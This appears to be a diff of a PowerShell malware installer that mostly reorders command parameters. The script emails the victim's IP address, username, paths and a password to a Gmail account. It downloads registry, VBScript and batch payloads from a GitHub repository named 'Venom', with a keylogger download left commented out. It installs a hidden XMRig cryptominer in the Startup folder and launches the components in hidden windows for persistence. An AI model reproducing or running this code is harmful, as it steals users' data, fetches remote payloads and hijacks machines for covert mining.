@@ -1,4 +1,3 @@
-
 function random_text {
     return -join ((97..122)+(65..90) | Get-Random -Count 5 | % {[char]$_})
 }
@@ -17,18 +16,18 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 # Generate Random Working Directory and Paths
-Set-Variable -Value (random_text) -Name wd
+Set-Variable -Name wd -Value (random_text)
 Set-Variable -Value ("$env:temp\$wd") -Name path
-Set-Variable -Value (Get-Location) -Name INITIALPATH
-Set-Variable -Name initial_dir -Value "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+Set-Variable -Name INITIALPATH -Value (Get-Location)
+Set-Variable -Value "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Name initial_dir
 
 # Read Email and Password from Files
-Set-Variable -Name email -Value (Get-Content PkUbTvqXFIdB.txt)
-Set-Variable -Value (Get-Content NzKnmxLrbsBw.txt) -Name password
+Set-Variable -Value (Get-Content PkUbTvqXFIdB.txt) -Name email
+Set-Variable -Name password -Value (Get-Content NzKnmxLrbsBw.txt)
 
 # Get Network Interface and IP Address
 Set-Variable -Value ((Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).InterfaceAlias) -Name InterfaceAlias
-Set-Variable -Value ((Get-NetIPAddress -InterfaceAlias $InterfaceAlias -AddressFamily IPv4).IPAddress) -Name IP
+Set-Variable -Name IP -Value ((Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $InterfaceAlias).IPAddress)
 
 # Save IP Address to File
 Set-Variable -Name ipFile -Value ("$initial_dir\ip.txt")
@@ -36,27 +35,27 @@ $IP | Out-File -FilePath $ipFile
 
 # Create Configuration File
 Set-Variable -Name configfile -Value ("$env:UserName.rat")
-Set-Content -Value "" -Path $configfile
+Set-Content -Path $configfile -Value ""
 Add-Content -Value $IP -Path $configfile
 Add-Content -Path $configfile -Value $password
-Add-Content -Path $configfile -Value $INITIALPATH
+Add-Content -Value $INITIALPATH -Path $configfile
 Add-Content -Value $env:temp -Path $configfile
 
 # Convert Secure Password to Plain Text
 Set-Variable -Name SecurePassword -Value (ConvertTo-SecureString $password -AsPlainText -Force)
-Set-Variable -Value ([Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword))) -Name plainPassword
-Add-Content -Path $configfile -Value $plainPassword
+Set-Variable -Name plainPassword -Value ([Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)))
+Add-Content -Value $plainPassword -Path $configfile
 
 # Send Email with Configuration File
 Send-MailMessage `
-    -SmtpServer "smtp.gmail.com" `
-    -Subject "IP Address Notification from $env:UserName" `
-    -From $email `
-    -Attachment $configfile `
-    -To $email `
-    -Credential (New-Object -ArgumentList $email, (ConvertTo-SecureString -AsPlainText -String $plainPassword -Force) -TypeName System.Management.Automation.PSCredential) `
+    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -Force -String $plainPassword -AsPlainText)) `
     -Port 587 `
-    -UseSsl
+    -From $email `
+    -Subject "IP Address Notification from $env:UserName" `
+    -UseSsl `
+    -To $email `
+    -SmtpServer "smtp.gmail.com" `
+    -Attachment $configfile
 
 # Copy and Remove Configuration File
 Remove-Item -Path $configfile
@@ -66,8 +65,8 @@ mkdir $path
 cd $path
 
 # Download Files
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg" -OutFile "QyjAaZDBbNPk.reg"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs" -OutFile "FoRAUwtxKkSB.vbs"
+Invoke-WebRequest -OutFile "QyjAaZDBbNPk.reg" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg"
+Invoke-WebRequest -OutFile "FoRAUwtxKkSB.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs"
 Invoke-WebRequest -OutFile "w.bat" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/w.bat"
 Invoke-WebRequest -OutFile "ZDaFvwjOosKx.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs"
 #Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/keylogger.ps1" -OutFile "KVbOiPPcus.ps1"
@@ -97,18 +96,18 @@ Start-Sleep -Seconds 30
 # Start-Process -ArgumentList "vaoYIkVglzTJ.cmd" -windowstyle hidden -FilePath "cscript.exe"
 
 # Create New Directory and Change to It
-New-Item -ItemType Directory -Path "$path" -Name "$wd"
+New-Item -ItemType Directory -Name "$wd" -Path "$path"
 cd $wd
 Set-Variable -Name currentDir -Value ($Pwd)
 
 # Download and Extract XMRig
-Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig-6.22.2-msvc-win64.zip"
+Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
 Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$initial_dir"
 
-Set-ItemProperty -Path "$initial_dir\xmrig-6.22.2" -Name Attributes -Value "Hidden"
+Set-ItemProperty -Value "Hidden" -Path "$initial_dir\xmrig-6.22.2" -Name Attributes
 
 # Replace XMRig Configuration File
-Set-Variable -Value ("$path\w.bat") -Name newConfigPath
+Set-Variable -Name newConfigPath -Value ("$path\w.bat")
 Set-Variable -Value ("$initial_dir\xmrig-6.22.2\w.bat") -Name targetConfigPath
 if (Test-Path -Path $newConfigPath) {
     Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
@@ -137,7 +136,7 @@ Remove-Item -Path "w.bat"
 Remove-Item -Path "QyjAaZDBbNPk.reg"
 Remove-Item -Path "FoRAUwtxKkSB.vbs"
 
-Set-ItemProperty -Name Attributes -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Value "Hidden"
+Set-ItemProperty -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Name Attributes -Value "Hidden"
 
 # Set-ItemProperty -Name Attributes -Path "$path\ZYHGCKXWlonm.ps1" -Value "Hidden"
 
@@ -146,9 +145,9 @@ Set-ItemProperty -Name Attributes -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Value "
 cd $initial_dir
 
 # Start Autorun
-Start-Process -ArgumentList "ZDaFvwjOosKx.vbs" -windowstyle hidden -FilePath "cscript.exe"
+Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwjOosKx.vbs"
 
-Start-Process -ArgumentList "$initial_dir\xmrig-6.22.2\w.bat" -windowstyle hidden -FilePath "cscript.exe"
+Start-Process -windowstyle hidden -ArgumentList "$initial_dir\xmrig-6.22.2\w.bat" -FilePath "cscript.exe"
 
 # Start Rig
 #Start-Process -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" -windowstyle hidden 
